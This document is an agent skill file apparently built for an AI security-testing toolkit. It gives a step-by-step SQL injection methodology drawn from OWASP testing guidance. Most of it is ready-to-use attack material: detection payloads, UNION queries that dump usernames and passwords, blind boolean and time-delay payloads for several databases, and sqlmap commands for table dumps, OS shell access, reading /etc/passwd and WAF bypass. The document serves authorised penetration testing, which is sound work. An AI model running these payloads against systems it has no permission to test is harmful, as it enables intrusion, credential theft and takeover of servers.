---
name: attack-sqli
description: Detect SQL injection in user-controlled input, fingerprint the backend database from its error text, and extract data — UNION in band, boolean and time oracles when blind, and sqlmap for the grind. Reach for it whenever a parameter can reach a database query.
metadata:
  acordia:
    family: web-attack
  cyberstrike:
    source: .cyberstrike/skill/WEB/OWASP_WSTG_4.2/wstg-injection/SKILL.md
    commit: 359655518
---

# SQL Injection

## Objective

Detect SQL injection in any user-controlled input, fingerprint the backend database, and extract data — in-band via UNION, or blind via boolean and time oracles.

## Testing Methodology

### Phase 1: Detection Payloads (test in every input)

```sql
'
''
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
" OR "1"="1" --
' AND 1=1 --
' AND 1=2 --
1' ORDER BY 1 --
1' ORDER BY 100 --
' UNION SELECT NULL --
```

### Phase 2: DB Fingerprinting (from error messages)

| Error Snippet                                     | Database   |
| -------------------------------------------------- | ---------- |
| `You have an error in your SQL syntax`            | MySQL      |
| `pg_query()`, `PSQLException`                     | PostgreSQL |
| `Microsoft SQL Server`, `Unclosed quotation mark` | MSSQL      |
| `ORA-`, `Oracle error`                            | Oracle     |
| `SQLite`                                          | SQLite     |

### Phase 3: Union-Based Extraction

```sql
-- Step 1: Find column count
' ORDER BY 1 -- ... ' ORDER BY N --
' UNION SELECT NULL,NULL,... --

-- Step 2: Find displayable column
' UNION SELECT 'a',NULL,NULL --

-- Step 3: Extract data
-- MySQL:
' UNION SELECT table_name,NULL FROM information_schema.tables --
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT username,password FROM users --

-- MSSQL:
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U' --

-- PostgreSQL:
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' --
```

### Phase 4: Blind SQLi

```sql
-- Boolean-based
' AND 1=1 --  (true response)
' AND 1=2 --  (false response)
' AND SUBSTRING(username,1,1)='a' --
' AND (SELECT COUNT(*) FROM users)>0 --

-- Time-based
' AND SLEEP(5) --                        (MySQL)
'; WAITFOR DELAY '0:0:5' --              (MSSQL)
' AND pg_sleep(5) --                     (PostgreSQL)
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- (Oracle)
```

### Phase 5: sqlmap Quick Reference

```bash
# Basic scan
sqlmap -u "https://TARGET/page?id=1" --batch --random-agent

# POST request
sqlmap -u "https://TARGET/login" --data="user=admin&pass=test" -p user --batch

# With authentication
sqlmap -u "https://TARGET/page?id=1" --cookie="session=abc123" --batch

# Enumerate
sqlmap -u "URL" --dbs                    # List databases
sqlmap -u "URL" -D dbname --tables       # List tables
sqlmap -u "URL" -D db -T users --dump    # Dump table
sqlmap -u "URL" --current-user           # Current DB user
sqlmap -u "URL" --is-dba                 # Check DBA privs

# Advanced
sqlmap -u "URL" --os-shell               # OS shell
sqlmap -u "URL" --file-read=/etc/passwd  # Read files
sqlmap -u "URL" --tamper=space2comment,between  # WAF bypass
sqlmap -u "URL" --level=5 --risk=3       # Thorough scan
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Data extracted from another tenant or the credential store | Critical (P1) |
| OS command execution or file read via the DB (`--os-shell`, `--file-read`) | Critical (P1) |
| Union-based extraction of arbitrary tables | Critical (P1) |
| Blind (boolean or time) oracle confirmed extracting data | High (P2) |
| DBA privileges held by the application account (`--is-dba`) | High (P2) |
| Database or schema names disclosed | Medium (P3) |
| Verbose SQL error disclosing the engine or query fragment | Low (P4) |

## Evidence Requirements

- Injection point (parameter, endpoint, HTTP method)
- Payload sent and the response that differentiates true from false
- Database engine identified, with the error snippet or fingerprint that named it
- For extraction: the rows returned, redacted of credential values
- For time-based: paired timings showing the delay tracks the payload

## Tools

- `sqlmap` (Phase 5) — automated detection, enumeration, extraction and WAF-bypass tampering
- `curl` — manual payload probing and boolean/time-oracle comparison

## References

- [PortSwigger: SQL injection](https://portswigger.net/web-security/sql-injection)
- [OWASP WSTG: Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
